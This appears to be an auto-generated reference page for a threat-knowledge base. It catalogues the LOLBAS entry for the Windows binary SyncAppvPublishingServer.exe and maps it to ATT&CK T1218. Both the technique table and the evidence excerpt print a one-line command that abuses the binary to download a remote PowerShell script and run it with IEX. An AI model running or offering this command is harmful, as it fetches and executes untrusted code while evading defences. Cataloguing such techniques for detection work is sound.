---
parsed_by: focuslocust
source: lolbas
type: generated
---
# SyncAppvPublishingServer.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `syncappvpublishingserver.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Syncappvpublishingserver.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Used by App-v to get App-v server lists

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/syncappvpublishingserver.md)
- Source verification: [source record](../../sources/lolbas/syncappvpublishingserver.exe.md)

## Aliases

- `SyncAppvPublishingServer.exe`
- `syncappvpublishingserver.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1218 - System Binary Proxy Execution](../../attack/techniques/T1218-system-binary-proxy-execution.md) | explicit | source | Command metadata lists T1218: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') \| IEX" |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/syncappvpublishingserver.exe.md)

## Source Verification

[source record](../../sources/lolbas/syncappvpublishingserver.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@monoxgas'
Person: Nick Landers
Author: Oddvar Moe
Commands:
- Category: Execute
Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
Description: Example command on how inject Powershell code into the process
```
